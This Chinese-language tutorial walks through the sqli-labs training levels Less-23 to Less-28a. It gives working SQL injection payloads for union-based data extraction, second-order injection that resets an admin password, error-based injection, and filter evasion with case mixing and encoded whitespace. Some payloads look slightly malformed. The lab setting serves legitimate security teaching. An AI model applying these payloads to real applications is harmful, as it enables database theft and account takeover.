# 十二、第二部分__page-2 Advacned injection Less-23~28a

### Less-23

sql语句为 `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; ` ，此处主要是在获取Id参数时候进行了 # -- 注释符号的过滤。

Solution: 

    ?id=-1' union select 1,@@datadir,'3
    # 此处构造payload后此时的sql语句为：
    SELECT * FROM users WHERE id='-1' union select 1,@@datadir,'3' limit 0,1
    # 此时前端输出了数据库路径，注入成功
    
讲解：
1. 首先使用id=-1，因为前端只输出一个select的数据，为了注出，一个select要没有结果，然后输出我们注出的数据，那就id=-1或者超过数据库数据都行。
2. 这里要注意的是单引号的闭合问题： `  1' union select 1,@@datadir,'3  `。
3. 此处可以进行报错注入、延时注入，可以利用 or '1'='1 进行闭合，这里不进行示例。

将@@datadir修改为其他内容，以下用联合注入方法进行。

- 获取数据库
```sql
    ?id=-1' union select 1,(select group_concat(schema_name) from  information_schema.schemata),'3
```
这里获取到所有的数据库名，从database()可以知道当前数据库为security。

- 查看数据表
```sql
    ?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),'3
```
此时会得到所有表名：emails,referers,uagents,users

- 查看表所有列
```sql
    ?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),'3
```
此时会得到该表的所有列：id,username,password

- 获取内容
```sql
    ?id=-1' union select 1,(select group_concat(username) from security.users limit 0,1),'3
```
这里会获得username列的所有内容：Dumb,Angelina,Dummy,secure,stupid...

    
### Less-24

本关为**二次排序注入**的示范例。二次排序注入也成为存储型的注入，就是将可能导致sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql 注入。

二次排序注入思路：
1. 黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL 语句或者命令。
2. 服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。
3. 黑客向服务端发送第二个与第一次不相同的请求数据信息。
4. 服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL 语句或者命令在服务端环境中执行。
5. 服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。

> EG: 此例子中我们的步骤是注册一个admin’#的账号，接下来登录该帐号后进行修改密码，注入修改的就是admin 的密码。

步骤演示：
1. users初始数据库为：

账号 | 密码
---- | ----
admin | 0

2.注册账号，注册账号页面填写账号：`admin'#` ，注册后数据库为：

账号 | 密码
---- | ----
admin   | 0
admin'# | 123

3. 登录admin'#，进入修改页面，修改密码为1，前端返回修改成功，此时数据库为：

账号 | 密码
---- | ----
admin   | 1
admin'# | 123

> 结论：可见，二次排序注入成功。

##### 思考——从源代码中思考为什么能注入成功？

首先在注册页面，在注册页面里有 `$username=  mysql_escape_string($_POST['username']) ;` 该语句存在，表示对username进行转义。

    # 那么执行注册的真实查重sql语句是这样的：
    select count(*) from users where username='admin\'#'

然后，在修改页面中有 `$username= $_SESSION["username"];` 该语句存在，表示username从Session获得，前端页面输入的密码均会进行 `mysql_real_escape_string()` 函数转义特殊字符。

    # 因此，这里获得后执行的真实语句是这样的：
    UPDATE users SET passwd="New_Pass" WHERE username ='admin'#' and password='$curr_pass' "; 
    
该语句引号闭合、注释都是完美的，所以能够注入成功。


### Less-25

本关卡主要为 or and 过滤。一般性提供一下几种思路：

1. 大小写变形 Or OR oR
2. 编码，hex urlencode
3. 添加注释 /* or */
4. 利用符号 and=&& or=||

本关卡示例报错payload: 

    ?id=1' || extractvalue(1,concat(0x7e,database()))--+
    

### Less-25a
    
不同于Less-25关的是sql语句没有的id进行 ' ' 处理，同时没有输出错误项，因此报错注入不能用。

其余基本上和Less-25示例没有差别，此处采用两种方式：延时注入和联合注入。

    # 示范联合注入：
    ?id=-1 union select 1,@@basedir,3--+
    # 示范or=||，这里输入limit的第一条记录
    ?id=2000 || 1=1 --+
    # 省略延时注入
    
    
### Less-26

TIPS: 本关卡在wamp下可能会存在apache解析问题，在linux则是正常。

本关卡结合Less-25，将 空格,or,and,/*,#,--,/ 等各种符号过滤。

对于 and,or 的方法同上。<br>
对于注释和结尾符此处我们只能构造闭合引号。<br>
对于空格：
1. %09 TAB键（水平）
2. %0a 新建一行
3. %0c 新的一页
4. %0d return功能
5. %0b TAB键（垂直）
6. %a0 空格

首先给出一个简单的payload: 

    ?id=2000'%0a||%0a'1'='1  => ?id=2000' or '1'='1'
    ?id=2000'%0a||'1 => ?id=2000' or '1'
    
这个理解应该不难。其他构造payload在不改变原sql基础上可以利用报错注入或延时注入等继续深层研究。

### Less-26a

本关卡与Less-26的区别在于sql语句的处理上，这里的处理是 `id=('$id')` 。因为前端不输出sql错误，所以排除报错注入。

这里示范使用union注入（注意此示范在wamp部署上是解析失败的）构造payload:

    id=2000')union%a0select%0a1,user(),('3
    # 等价于
    $sql = select * from users where id=('2000') union select 1,user(),('3') limit 0,1;

    
### Less-27

本关卡主要考察 union,select 和Less-26过滤的字符。

此处我们利用空格替换和大小写混合突破，示例payload:

    ?id=2000'unIon%a0SelEcT%a01,database(),3||'1
    # 注意后面的3||'1'会判断输出布尔值1
    

### Less-27a

本关卡与Less-27的区别在于对id处理，这里是 `"id"` ，同时mysql报错不会回显，示例payload:

    ?id=2000"%a0UnIonSElecT%a0,1,user(),"3


### Less-28

本关卡与Less-27没有太大的差距，直接给出payload:

    ?id=2000')%a0unionselect(1),(user()),(3)||('1
    # select(1),2,3; # 注意：没有空格也可以输出成功的。


### Less-28a

本关卡与Less-28基本一致，只是过滤条件少了几个。直接给出payload:

    ?id=2000%27)union%0bsElect%0b1,@@basedir,3|(%271



